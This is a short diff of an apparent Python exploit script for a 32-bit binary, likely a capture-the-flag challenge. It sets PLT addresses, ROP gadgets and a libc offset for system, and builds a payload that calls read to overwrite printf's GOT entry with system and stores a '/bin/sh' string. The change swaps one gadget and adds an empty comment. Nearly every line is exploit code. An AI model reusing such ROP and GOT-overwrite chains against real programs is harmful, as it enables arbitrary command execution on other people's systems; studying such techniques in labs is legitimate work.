@@ -9,7 +9,7 @@ read_plt = 0x8048390
 printf_plt = 0x80483a0
 
 pr_gadget = 0x0804860b
-pppr_gadget = 0x08048609
+pppr_gadget = 0x08048609 # 
 
 sys_offset = 0x9ae70
 
@@ -48,7 +48,7 @@ pay += p32(8) #binsh save
 
 
 pay += p32(read_plt)
-pay += p32(pppr_gadget)
+pay += p32(pr_gadget)
 pay += p32(0)
 pay += p32(printf_got)	# printf arr --> system arr
 pay += p32(4)
